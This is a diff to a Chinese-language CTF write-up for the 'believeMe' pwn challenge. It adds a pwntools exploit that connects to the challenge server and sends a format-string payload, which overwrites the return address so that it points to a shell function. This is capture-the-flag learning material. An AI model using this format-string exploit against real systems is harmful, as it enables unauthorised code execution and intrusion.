@@ -141,3 +141,20 @@ gdb-peda$ stack 30
 我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag
 
 (这里有一个挺坑的地方就是你在本地复现时终端运行得到地址和用pwntools得到的地址可能不一样，这块我还是不懂是什么原理，希望知道的师傅能讲一下学习一波)
+
+EXP
+```python
+from pwn import*
+context(os='linux',arch='i386')#,log_level='debug')
+#n = process('./believeMe')
+n = remote('18.223.228.52',13337)
+
+shell_addr = 0x804867b
+#ret_addr = 0xffffd030 - 0x4
+ret_addr = 0xffffdd30 - 0x4
+payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size='short')
+n.recvuntil('But......... how ????')
+#n.sendline('%21$x')
+n.sendline(payload)
+n.interactive()
+```
